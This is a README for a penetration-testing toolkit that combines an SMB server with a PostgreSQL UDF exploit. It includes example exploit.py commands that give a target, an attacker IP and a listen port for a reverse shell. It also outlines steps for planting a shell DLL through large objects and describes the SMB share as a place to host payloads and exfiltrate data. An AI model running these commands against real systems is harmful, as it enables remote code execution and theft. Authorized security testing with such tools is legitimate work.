# Integrated SMB Server and PostgreSQL UDF Exploitation Toolkit

This toolkit combines an SMB server with PostgreSQL UDF (User-Defined Function) exploitation capabilities, providing a comprehensive solution for security testing and penetration testing scenarios.

## Features

- **Integrated SMB Server**: Deploy a fully functional SMB server for file sharing during penetration tests
- **PostgreSQL UDF Exploitation**: Leverage PostgreSQL User-Defined Function vulnerabilities to execute code
- **Flexible Operation Modes**: Run either the SMB server or PostgreSQL exploit independently, or combine both
- **Robust Error Handling**: Comprehensive error checking and reporting
- **Detailed Logging**: Clear logging of all operations for monitoring and debugging

## Requirements

- Python 3.6 or higher
- Impacket library (for SMB server functionality)
- Requests library (for HTTP communication)

### Required Python Packages

```bash
pip install impacket requests
```

## Installation

1. Clone or download this repository:
   ```bash
   git clone https://github.com/user/postgres-smb-toolkit.git
   cd postgres-smb-toolkit
   ```

2. Install the required dependencies:
   ```bash
   pip install -r requirements.txt
   ```

3. Make the script executable (Unix-based systems):
   ```bash
   chmod +x exploit.py
   ```

## Usage

The toolkit can be used in three modes:

1. **SMB Server Only Mode**: Just run the SMB server component
2. **PostgreSQL Exploit Only Mode**: Only execute the PostgreSQL UDF exploitation
3. **Combined Mode**: Run both components together

### Command-line Arguments

```
usage: exploit.py [-h] [--smb-only | --postgres-only] [--share-name SHARE_NAME]
                  [--share-path SHARE_PATH] [--interface INTERFACE]
                  [--smb-port SMB_PORT] [--target-server TARGET_SERVER]
                  [--attacker-ip ATTACKER_IP] [--listen-port LISTEN_PORT]
                  [--udf-path UDF_PATH] [--output-path OUTPUT_PATH]
                  [--loid LOID] [--func-name FUNC_NAME]

Integrated SMB Server and PostgreSQL UDF Exploitation Tool

options:
  -h, --help            show this help message and exit
  --smb-only            Run only the SMB server
  --postgres-only       Run only the PostgreSQL UDF exploit

SMB Server Options:
  --share-name SHARE_NAME
                        Name of the SMB share (default: SHARE)
  --share-path SHARE_PATH
                        Path to the directory to share (default: ./share)
  --interface INTERFACE
                        Interface to bind the SMB server to (default: 0.0.0.0)
  --smb-port SMB_PORT   Port for the SMB server (default: 445)

PostgreSQL UDF Exploit Options:
  --target-server TARGET_SERVER
                        Target server IP:port for PostgreSQL exploit
  --attacker-ip ATTACKER_IP
                        Attacker IP for reverse shell
  --listen-port LISTEN_PORT
                        Port to listen on for reverse shell
  --udf-path UDF_PATH   Path to the UDF DLL (default: ./postgres_udf_shell.dll)
  --output-path OUTPUT_PATH
                        Path on target to save the DLL (default: C:\Users\Public\postgres_udf_shell.dll)
  --loid LOID           Large object ID to use (default: 1337)
  --func-name FUNC_NAME
                        Name for the UDF function (default: rev_shell)
```

### Example Usage Scenarios

#### 1. Start SMB server only:
```bash
./exploit.py --smb-only --share-name TOOLS --share-path /tmp/tools
```

#### 2. Run PostgreSQL UDF exploit only:
```bash
./exploit.py --postgres-only --target-server 192.168.1.10:8080 --attacker-ip 192.168.1.5 --listen-port 4444 --udf-path ./postgres_udf_shell.dll
```

#### 3. Run both with custom options:
```bash
./exploit.py --share-name PAYLOAD --share-path ./existing_payloads --target-server 192.168.1.10:8080 --attacker-ip 192.168.1.5 --listen-port 4444 --udf-path ./existing_payloads/postgres_udf_shell.dll
```

## How It Works

### SMB Server Component

The SMB server uses Impacket's SMB server functionality to create a network share accessible to the target system. This can be used for:

- Hosting payloads for exploitation
- Exfiltrating data from the target
- Providing access to tools during a penetration test

The server automatically detects the best available method for starting the SMB service, including:
- Using the `impacket-smbserver` command if available
- Utilizing the Python Impacket library directly
- Locating alternative paths for the SMB server script

### PostgreSQL UDF Exploitation Component

The PostgreSQL exploitation process follows these steps:

1. **Delete existing LO**: Removes any existing Large Object with the specified ID
2. **Create new LO**: Creates a new Large Object for UDF injection
3. **Inject UDF**: Injects the UDF payload into the Large Object
4. **Export UDF**: Exports the UDF library to the target's filesystem
5. **Create function**: Creates a function that uses the UDF library
6. **Trigger shell**: Triggers the UDF to establish a reverse shell back to the attacker

## Security Considerations

This tool is designed for legitimate security testing and should only be used with explicit permission on systems you are authorized to test. Unauthorized use of this tool may violate local, state, and federal law.

## License

This project is licensed under the MIT License - see the LICENSE file for details.

## Acknowledgments

- [Impacket](https://github.com/SecureAuthCorp/impacket) - Used for SMB server functionality
- Various PostgreSQL security research that made this toolkit possible